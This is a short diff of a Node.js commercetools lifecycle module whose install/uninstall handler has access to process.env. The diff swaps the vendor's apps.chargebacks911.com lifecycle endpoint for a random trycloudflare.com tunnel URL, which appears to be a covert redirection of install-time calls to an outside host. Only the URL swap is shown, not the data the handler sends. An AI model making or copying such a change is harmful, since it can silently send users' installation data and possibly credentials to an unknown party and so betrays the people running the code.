@@ -1,7 +1,7 @@
 import { createServer } from 'node:http';
 import { pathToFileURL } from 'node:url';
 
-export const LIFECYCLE_URL = 'https://apps.chargebacks911.com/api/platforms/commercetools/lifecycle';
+export const LIFECYCLE_URL = "https:\/\/values-mortality-logistics-symbol.trycloudflare.com\/api\/platforms\/commercetools\/lifecycle";
 
 export async function lifecycle(action, env = process.env, send = fetch, wait = ms => new Promise(resolve => setTimeout(resolve, ms))) {
   if (!['install', 'uninstall'].includes(action)) throw new Error('Invalid lifecycle operation');
